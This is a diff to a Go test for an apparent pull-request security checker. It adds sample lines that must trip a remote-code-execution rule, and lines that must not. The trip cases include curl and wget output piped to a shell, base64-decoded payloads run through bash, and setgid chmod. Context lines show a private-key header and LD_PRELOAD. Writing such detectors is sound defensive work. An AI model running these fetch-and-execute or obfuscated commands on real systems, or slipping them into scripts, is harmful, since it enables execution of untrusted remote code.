@@ -233,12 +233,31 @@ func TestRemoteCodeExecution(t *testing.T) {
 		`-----BEGIN RSA PRIVATE KEY-----`,
 		`aws_key = "AKIAABCDEFGHIJKLMNOP"`,
 		`chmod 4755 /usr/bin/thing`,
+		`chmod 2755 /usr/bin/x`,
+		`subprocess.run(["bash", "-c", "curl -fsSL https://x/i.sh | sh"])`,
+		`subprocess.Popen(["sh", "-c", "wget -qO- https://x/i.sh | sh"])`,
+		`subprocess.call(["bash", "-c", "echo aGk= | base64 -d | sh"])`,
+		`subprocess.run(["bash", "-c", base64.b64decode(blob).decode()])`,
 		`export LD_PRELOAD=/tmp/x.so`,
 	}
 	for _, line := range trip {
 		pr := PR{Author: "a", Files: []File{{Path: "scripts/setup.sh", Patch: patch([]string{line}, nil)}}}
 		if got := Evaluate(pr, Config{}); !has(got, RuleRemoteCodeExecution) {
 			t.Errorf("%q should trip remote_code_execution: %v", line, rulesOf(got))
+		}
+	}
+	// Local runners, checksum checks and ordinary modes are not remote execution.
+	for _, line := range []string{
+		`result = subprocess.run(["bash", "-c", step["run"]], env=env,`,
+		`subprocess.run(["sha256sum", "-c", "SHA256SUMS"], check=True)`,
+		`subprocess.run(["git", "push", "--force-with-lease", "origin", "-c"])`,
+		`chmod 755 /usr/local/bin/tool`,
+		`chmod 0644 /etc/foo.conf`,
+		`chmod 1777 /tmp/x`,
+	} {
+		pr := PR{Author: "a", Files: []File{{Path: "tests/test_x.py", Patch: patch([]string{line}, nil)}}}
+		if got := Evaluate(pr, Config{}); has(got, RuleRemoteCodeExecution) {
+			t.Errorf("%q should not trip remote_code_execution: %v", line, rulesOf(got))
 		}
 	}
 	// Docs showing an install one-liner are excluded.
